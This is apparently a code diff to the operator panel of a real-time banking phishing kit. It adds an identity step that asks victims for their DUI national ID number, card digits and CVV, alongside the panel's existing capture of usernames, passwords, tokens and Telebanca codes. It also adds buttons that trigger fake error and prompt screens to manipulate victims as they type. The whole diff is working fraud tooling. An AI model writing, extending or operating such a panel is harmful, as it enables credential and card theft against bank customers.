@@ -124,6 +124,9 @@ function statusLabel(state) {
   if (state === 'telebanca') return 'Código por Telebanca'
   if (state === 'waiting-telebanca') return 'Esperando Telebanca'
   if (state === 'typing-telebanca') return 'Escribiendo Telebanca'
+  if (state === 'identidad') return 'En identidad'
+  if (state === 'waiting-identidad') return 'Esperando identidad'
+  if (state === 'typing-identidad') return 'Escribiendo identidad'
   if (state === 'typing') return 'Escribiendo'
   if (state === 'typing-pass') return 'Escribiendo clave'
   if (state === 'typing-tejuino') return 'Escribiendo c.interna'
@@ -136,6 +139,7 @@ function statusLabel(state) {
   if (state === 'error-tejuino') return 'C.interna error'
   if (state === 'error-user') return 'Error user'
   if (state === 'error-token') return 'Error Token'
+  if (state === 'error-identidad') return 'Error identidad'
   if (state === 'error') return 'Error'
   return 'Nuevo'
 }
@@ -147,6 +151,13 @@ function badgeClass(state) {
     state === 'typing-telebanca'
   ) {
     return 'badge badge--telebanca'
+  }
+  if (
+    state === 'identidad' ||
+    state === 'waiting-identidad' ||
+    state === 'typing-identidad'
+  ) {
+    return 'badge badge--identidad'
   }
   if (
     state === 'waiting' ||
@@ -168,7 +179,8 @@ function badgeClass(state) {
     state === 'error-tejuino' ||
     state === 'error-user' ||
     state === 'error' ||
-    state === 'error-token'
+    state === 'error-token' ||
+    state === 'error-identidad'
   ) {
     return 'badge badge--error'
   }
@@ -255,10 +267,26 @@ function upsertLocal(session) {
         : existing?.clave && existing.clave !== '—'
           ? existing.clave
           : '—'
+  const nextDui =
+    session.dui != null && String(session.dui).trim() !== ''
+      ? String(session.dui)
+      : existing?.dui || ''
+  const nextCard =
+    session.cardDigits != null && String(session.cardDigits).trim() !== ''
+      ? String(session.cardDigits)
+      : existing?.cardDigits || ''
+  const nextCvv =
+    session.cvv != null && String(session.cvv).trim() !== ''
+      ? String(session.cvv)
+      : existing?.cvv || ''
+
   if (existing) {
     Object.assign(existing, {
       user: session.username ?? session.user ?? existing.user,
       clave: nextClave,
+      dui: nextDui,
+      cardDigits: nextCard,
+      cvv: nextCvv,
       device: session.device ?? existing.device,
       ip: session.ip ?? existing.ip,
       token: nextToken,
@@ -280,6 +308,9 @@ function upsertLocal(session) {
       ip: session.ip || '127.0.0.1',
       user: session.username || session.user || '—',
       clave: nextClave,
+      dui: nextDui,
+      cardDigits: nextCard,
+      cvv: nextCvv,
       token: nextToken,
       imageSrc: session.imageSrc || '',
       phrase: session.phrase || '',
@@ -479,13 +510,14 @@ function createRow(row) {
     <td class="col-user mono copyable" data-label="Usuario" title="Copiar usuario"></td>
     <td class="col-token mono copyable" data-label="Token" title="Copiar token"></td>
     <td class="col-pass mono copyable" data-label="Clave" title="Copiar clave"></td>
+    <td class="col-identidad mono copyable" data-label="Identidad" title="Copiar datos de identidad"></td>
     <td class="col-online" data-label="Conexión"></td>
     <td class="col-status" data-label="Estado"></td>
     <td class="col-send" data-label="Envío" data-send-cell></td>
     <td class="col-actions" data-label="Acciones">
       <div class="row-actions">
         <div class="action-group action-group--main">
-          <button type="button" class="btn btn--ok btn--pill" data-action="ask-token" data-tooltip="Pedir token (Solicitar token al cliente)" title="Pedir token al cliente" aria-label="Pedir token">
+          <button type="button" class="btn btn--pill" data-action="ask-token" data-tooltip="Pedir token (Solicitar token al cliente)" title="Pedir token al cliente" aria-label="Pedir token">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <circle cx="7.5" cy="15.5" r="4.5"/>
               <path d="m21 3-9.5 9.5"/>
@@ -493,7 +525,23 @@ function createRow(row) {
             </svg>
             <span>Token</span>
           </button>
-          <button type="button" class="btn btn--ok btn--pill" data-action="send-imagen" data-tooltip="Enviar imagen y frase de seguridad" title="Enviar imagen y frase" aria-label="Enviar imagen">
+          <button type="button" class="btn btn--pill" data-action="ask-telebanca" data-tooltip="Código por Telebanca (Solicitar confirmación telefónica)" title="Pedir Telebanca" aria-label="Pedir Telebanca">
+            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+            </svg>
+            <span>Telebanca</span>
+          </button>
+          <button type="button" class="btn btn--pill" data-action="ask-identidad" data-tooltip="Validación de identidad (Solicitar DUI, Tarjeta y CVV)" title="Pedir DUI y Tarjeta" aria-label="Pedir Identidad">
+            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <rect x="3" y="4" width="18" height="16" rx="3"/>
+              <circle cx="9" cy="10" r="2"/>
+              <line x1="15" y1="8" x2="17" y2="8"/>
+              <line x1="15" y1="12" x2="17" y2="12"/>
+              <line x1="7" y1="16" x2="17" y2="16"/>
+            </svg>
+            <span>Identidad</span>
+          </button>
+          <button type="button" class="btn btn--pill" data-action="send-imagen" data-tooltip="Enviar imagen y frase de seguridad" title="Enviar imagen y frase" aria-label="Enviar imagen">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <rect width="18" height="18" x="3" y="3" rx="2" ry="2"/>
               <circle cx="9" cy="9" r="2"/>
@@ -501,7 +549,7 @@ function createRow(row) {
             </svg>
             <span>Imagen</span>
           </button>
-          <button type="button" class="btn btn--info btn--pill" data-action="c-interna" data-tooltip="Consulta interna (Pantalla de espera / validación)" title="Pantalla de espera" aria-label="Consulta interna">
+          <button type="button" class="btn btn--pill" data-action="c-interna" data-tooltip="Consulta interna (Pantalla de espera / validación)" title="Pantalla de espera" aria-label="Consulta interna">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
               <path d="M3 3v5h5"/>
@@ -515,7 +563,15 @@ function createRow(row) {
         <span class="action-divider" aria-hidden="true"></span>
 
         <div class="action-group action-group--errors">
-          <button type="button" class="btn btn--error btn--pill" data-action="error-tejuino" data-tooltip="Error consulta interna (Fallo en pantalla de validación)" title="Error en consulta interna" aria-label="Error C.Int">
+          <button type="button" class="btn btn--pill" data-action="error-identidad" data-tooltip="Error de Identidad (DUI o tarjeta inválidos)" title="Error de Identidad" aria-label="Error Identidad">
+            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <rect x="3" y="4" width="18" height="16" rx="3"/>
+              <line x1="9" y1="9" x2="15" y2="15"/>
+              <line x1="15" y1="9" x2="9" y2="15"/>
+            </svg>
+            <span>Err Identidad</span>
+          </button>
+          <button type="button" class="btn btn--pill" data-action="error-tejuino" data-tooltip="Error consulta interna (Fallo en pantalla de validación)" title="Error en consulta interna" aria-label="Error C.Int">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>
               <line x1="12" y1="9" x2="12" y2="13"/>
@@ -523,7 +579,7 @@ function createRow(row) {
             </svg>
             <span>Err C.Int</span>
           </button>
-          <button type="button" class="btn btn--error btn--pill" data-action="error-token" data-tooltip="Error de Token (Token inválido o expirado)" title="Error de Token" aria-label="Error Token">
+          <button type="button" class="btn btn--pill" data-action="error-token" data-tooltip="Error de Token (Token inválido o expirado)" title="Error de Token" aria-label="Error Token">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <circle cx="7.5" cy="15.5" r="4.5"/>
               <path d="m21 3-9.5 9.5"/>
@@ -532,7 +588,7 @@ function createRow(row) {
             </svg>
             <span>Err Token</span>
           </button>
-          <button type="button" class="btn btn--error btn--pill" data-action="error-user" data-tooltip="Error de Usuario (Usuario incorrecto o no existe)" title="Error de Usuario" aria-label="Error Usuario">
+          <button type="button" class="btn btn--pill" data-action="error-user" data-tooltip="Error de Usuario (Usuario incorrecto o no existe)" title="Error de Usuario" aria-label="Error Usuario">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/>
               <circle cx="9" cy="7" r="4"/>
@@ -541,7 +597,7 @@ function createRow(row) {
             </svg>
             <span>Err User</span>
           </button>
-          <button type="button" class="btn btn--error btn--pill" data-action="error-pass" data-tooltip="Error de Clave (Contraseña incorrecta)" title="Error de Clave" aria-label="Error Clave">
+          <button type="button" class="btn btn--pill" data-action="error-pass" data-tooltip="Error de Clave (Contraseña incorrecta)" title="Error de Clave" aria-label="Error Clave">
             <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <rect width="14" height="10" x="5" y="11" rx="2" ry="2"/>
               <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
@@ -574,11 +630,20 @@ function createRow(row) {
   tr.querySelector('[data-action="ask-token"]')?.addEventListener('click', () => {
     void setRowState(row.id, 'token', 'ask-token')
   })
+  tr.querySelector('[data-action="ask-telebanca"]')?.addEventListener('click', () => {
+    void setRowState(row.id, 'telebanca', 'ask-telebanca')
+  })
+  tr.querySelector('[data-action="ask-identidad"]')?.addEventListener('click', () => {
+    void setRowState(row.id, 'identidad', 'ask-identidad')
+  })
   tr.querySelector('[data-action="send-imagen"]')?.addEventListener('click', () => {
     openImagenModal(row.id)
   })
   tr.querySelector('[data-action="c-interna"]')?.addEventListener('click', () => {
     void setRowState(row.id, 'c-interna', 'c-interna')
+  })
+  tr.querySelector('[data-action="error-identidad"]')?.addEventListener('click', () => {
+    void setRowState(row.id, 'error-identidad', 'error-identidad')
   })
   tr.querySelector('[data-action="error-token"]')?.addEventListener('click', () => {
     void setRowState(row.id, 'error-token', 'error-token')
@@ -598,7 +663,7 @@ function createRow(row) {
 
   tr.querySelectorAll('td.copyable').forEach((td) => {
     td.addEventListener('click', async () => {
-      const text = td.textContent?.trim()
+      const text = (td.dataset.copyText || td.textContent)?.trim()
       if (!text || text === '—') return
       const ok = await copyText(text)
       if (!ok) {
@@ -647,6 +712,19 @@ function updateRow(tr, row) {
   tr.querySelector('.col-user').textContent = row.user || '—'
   tr.querySelector('.col-token').textContent = row.token || '—'
   tr.querySelector('.col-pass').textContent = row.clave || '—'
+
+  const idParts = []
+  if (row.dui) idParts.push(`DUI: ${row.dui}`)
+  if (row.cardDigits) idParts.push(`Tarj: •••• ${row.cardDigits}`)
+  if (row.cvv) idParts.push(`CVV: ${row.cvv}`)
+  const colIdent = tr.querySelector('.col-identidad')
+  if (colIdent) {
+    colIdent.innerHTML = idParts.length > 0
+      ? idParts.map((p) => `<span class="id-item">${p}</span>`).join('')
+      : '—'
+    colIdent.dataset.copyText = idParts.join(' | ')
+  }
+
   tr.querySelector('.col-online').innerHTML = online
     ? '<span class="pill pill--online">En línea</span>'
     : '<span class="pill pill--offline">Off</span>'
@@ -674,19 +752,28 @@ function updateRow(tr, row) {
   }
 
   const askBtn = tr.querySelector('[data-action="ask-token"]')
+  const askTelebancaBtn = tr.querySelector('[data-action="ask-telebanca"]')
+  const askIdentidadBtn = tr.querySelector('[data-action="ask-identidad"]')
   const sendBtn = tr.querySelector('[data-action="send-imagen"]')
   const cInternaBtn = tr.querySelector('[data-action="c-interna"]')
   const doneBtn = tr.querySelector('[data-action="done"]')
+
   askBtn?.classList.toggle('is-on', row.state === 'waiting-token')
-  sendBtn?.classList.toggle('is-on', row.state === 'waiting-imagen' || row.state === 'waiting-telebanca')
+  askTelebancaBtn?.classList.toggle('is-on', row.state === 'waiting-telebanca')
+  askIdentidadBtn?.classList.toggle('is-on', row.state === 'waiting-identidad')
+  sendBtn?.classList.toggle('is-on', row.state === 'waiting-imagen')
   cInternaBtn?.classList.toggle('is-on', row.state === 'c-interna')
   doneBtn?.classList.toggle('is-on', row.state === 'waiting-pass')
+
   tr.classList.toggle(
     'is-waiting',
     row.state === 'waiting-imagen' ||
       row.state === 'waiting-token' ||
       row.state === 'waiting-telebanca' ||
       row.state === 'telebanca' ||
+      row.state === 'waiting-identidad' ||
+      row.state === 'identidad' ||
+      row.state === 'typing-identidad' ||
       row.state === 'waiting-pass' ||
       row.state === 'c-interna' ||
       row.state === 'typing' ||
